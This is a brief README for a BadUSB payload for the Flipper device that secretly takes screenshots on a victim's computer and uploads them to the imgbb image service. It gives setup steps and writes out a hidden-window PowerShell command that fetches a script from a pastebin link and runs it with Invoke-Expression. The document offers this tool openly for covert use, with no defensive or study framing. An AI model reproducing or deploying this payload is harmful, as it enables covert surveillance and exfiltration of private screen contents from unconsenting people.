# BadUSB screen-grabber
## Automatically creates screenshots on victims computer and sends them to imgbb api

* Modify ssgrab.ps1 and change `API KEY` to the API key you can find on https://imgbb.com/api
* Upload ssgrab.ps1 to pastebin
* Modify `powershell -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadString('PASTEBIN LINK') | Invoke-Expression` in payload.txt so that it has your pastebin link as raw and upload to Flipper
